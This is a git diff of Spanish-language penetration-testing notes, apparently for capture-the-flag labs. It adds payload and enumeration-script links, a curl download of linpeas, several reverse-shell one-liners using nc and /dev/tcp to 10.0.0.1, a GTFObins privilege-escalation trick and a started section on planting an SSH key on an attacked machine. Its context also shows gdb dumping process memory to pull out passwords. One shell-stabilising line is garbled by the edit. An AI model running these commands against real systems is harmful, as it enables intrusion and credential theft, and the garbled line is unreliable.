@@ -7,6 +7,15 @@
     - sub dominios: 
         - https://github.com/theMiddleBlue/DNSenum/blob/master/wordlist/subdomains-top1mil-20000.txt
 
+- sitios payloads:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings
+
+- scripts enumeration:
+    - https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
+    - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+        - bajarlo `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh`
+    - https://github.com/DominicBreuker/pspy enumera los procesos sin necesidad de ser root.
+
 - usando nmap
     - `-sU` scanear puertos UDP
     - `-p80` escanear puerto 80, `-p-` escanear todos los puertos
@@ -27,11 +36,14 @@
 - Reverse shell
     - si se puede subir archivos al sitio se usa un [simple webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php)
     - [reverse shell cheatsheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).
-    - `nc -e /bin/sh 10.0.0.1 1234`
+    - si esta netcat disponible usamos `nc -e /bin/sh 10.0.0.1 1234`
     - si `nc` no soporte la opcion `-e`: 
         - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
+    - si no hay **netcat** en la maquina remota usamos `	
+nc -lvp 8080` en nuestra maquina y `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` en la remota. la ip 10.0.0.1 es la de nuestra maquina.
+    - intentar con `'/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"'`
     - si se conecta usamos:
-        - `python3 -c 'import pty;pty.spawn("/bin/bash")'` luego Presionar `Ctrl+Z` e ingresar `stty raw -echo`. Posteriormente ingresar `fg` y presionar ENTER dos veces y regresara al reverse shell pero podremos usar ctrl+c y ctrl+z
+        - `python3 -c 'import pty;pty.spawn("/bin/bash")'` luego Presionar `Ctrl+Z` e ingresar `stty raw -echo;fg`-c y presionar ENTER dos veces y regresara al reverse shell pero podremos usar ctrl+c y ctrl+z
 
     - si usamos `sudo -l` y no funciona usamos:
         - [GTFObins](https://gtfobins.github.io/gtfobins/at/) `echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null`
@@ -69,6 +81,29 @@
     - `(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>`
     - `(gdb) q`
     - `strings /tmp/mem_ftp #User and password` <- buscar strings
+
+- ssh id_rsa reemplazar en maquina atacada:
+    - generamos el id_rsa `ssh-keygen -t rsa`
+    - 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
